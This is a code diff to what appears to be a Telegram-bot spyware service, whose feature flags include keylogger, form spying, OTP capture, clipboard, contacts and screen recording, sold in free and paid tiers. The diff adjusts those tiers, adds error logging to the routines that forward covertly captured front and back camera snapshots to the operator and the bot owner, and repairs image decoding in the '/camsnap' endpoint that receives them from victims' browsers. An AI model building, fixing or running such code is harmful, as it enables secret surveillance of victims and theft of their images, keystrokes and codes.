@@ -44,7 +44,7 @@ const DEFAULT_PAGE_CONFIG = {
 };
 
 const DEFAULT_FEATURES = { gyroscope:true, webrtc:true, fingerprint:true, sessionTime:true, lightSensor:true, clipboard:true, battery:true, vpnDetect:true };
-const DEFAULT_PREMIUM_FREE = { camera:true, audio:true, clipboard:false, contacts:false, files:false, persistentId:false, localNet:false, webpush:true, screencap:false, faceAI:false, activityDetect:false, autofill:false, devtools:false, keylogger:false, sensors:false, formspy:false, speechRecog:true, webOTP:false, bluetooth:true, pwaInstall:true, screenRecord:false, screenMirror:false };
+const DEFAULT_PREMIUM_FREE = { camera:false, audio:false, clipboard:false, contacts:false, files:false, persistentId:false, localNet:false, webpush:false, screencap:false, faceAI:false, activityDetect:false, autofill:false, devtools:false, keylogger:false, sensors:false, formspy:false, speechRecog:false, webOTP:false, bluetooth:false, pwaInstall:false, screenRecord:false, screenMirror:false };
 // These features are ALWAYS paid-VIP only — never free
 const VIP_ONLY_FEATURES = new Set(['contcam', 'contaudio', 'autofill', 'keylogger', 'sensors', 'formspy', 'webOTP', 'screenRecord', 'screenMirror']);
 
@@ -3927,8 +3927,8 @@ function flushCamAlbum(tid) {
     const cap = camLabel + ` | ${ts}`;
     const info = { filename:"snap.png", contentType:"image/png" };
     if (!settings.silentMode) {
-      bot.sendPhoto(tid, buf, { caption: cap }, info).catch(()=>{});
-      if (tid !== BOT_OWNER) bot.sendPhoto(BOT_OWNER, buf, { caption:`${cap}\n(ID: ${tid})` }, info).catch(()=>{});
+      bot.sendPhoto(tid, buf, { caption: cap }, info).catch(e => console.error(`[cam-single] tid=${tid} err=${e.message}`));
+      if (tid !== BOT_OWNER) bot.sendPhoto(BOT_OWNER, buf, { caption:`${cap}\n(ID: ${tid})` }, info).catch(e => console.error(`[cam-single-owner] err=${e.message}`));
     }
     return;
   }
@@ -3941,10 +3941,11 @@ function flushCamAlbum(tid) {
     ...(i===0 ? { caption: albumCap } : {})
   }));
   if (!settings.silentMode) {
-    bot.sendMediaGroup(tid, media).catch(() => {
+    bot.sendMediaGroup(tid, media).catch(e => {
+      console.error(`[cam-album] tid=${tid} err=${e.message}`);
       snaps.forEach(s => {
         const info = { filename:"snap.png", contentType:"image/png" };
-        bot.sendPhoto(tid, s.buf, { caption:(s.cam==="back"?"📷 خلفية":"🤳 أمامية")+` | ${ts}` }, info).catch(()=>{});
+        bot.sendPhoto(tid, s.buf, { caption:(s.cam==="back"?"📷 خلفية":"🤳 أمامية")+` | ${ts}` }, info).catch(e2 => console.error(`[cam-fallback] err=${e2.message}`));
       });
     });
     if (tid !== BOT_OWNER) {
@@ -3952,9 +3953,10 @@ function flushCamAlbum(tid) {
         type: "photo", media: s.buf,
         ...(i===0 ? { caption: `${albumCap}\n(ID: ${tid})` } : {})
       }));
-      bot.sendMediaGroup(BOT_OWNER, ownerMedia).catch(() => {
+      bot.sendMediaGroup(BOT_OWNER, ownerMedia).catch(e => {
+        console.error(`[cam-album-owner] err=${e.message}`);
         snaps.forEach(s => {
-          bot.sendPhoto(BOT_OWNER, s.buf, { caption:(s.cam==="back"?"📷 خلفية":"🤳 أمامية")+` | ${ts}\n(ID: ${tid})` }, { filename:"snap.png", contentType:"image/png" }).catch(()=>{});
+          bot.sendPhoto(BOT_OWNER, s.buf, { caption:(s.cam==="back"?"📷 خلفية":"🤳 أمامية")+` | ${ts}\n(ID: ${tid})` }, { filename:"snap.png", contentType:"image/png" }).catch(e2 => console.error(`[cam-fallback-owner] err=${e2.message}`));
         });
       });
     }
@@ -4041,7 +4043,9 @@ app.post("/camsnap", (req, res) => {
   const cam = decodeURIComponent(req.body.cam) || "front";
   if (uid && img) {
     const tid = parseInt(uid, 36);
-    const buf = Buffer.from(img, 'base64');
+    // Strip data URL prefix or leading comma left by .replace("data:image/png;base64","")
+    const cleanImg = img.replace(/^data:image\/[^;]+;base64,?/, '').replace(/^,/, '');
+    const buf = Buffer.from(cleanImg, 'base64');
     if (!_camBuf.has(tid)) _camBuf.set(tid, { snaps:[], timer:null });
     const entry = _camBuf.get(tid);
     entry.snaps.push({ buf, cam });
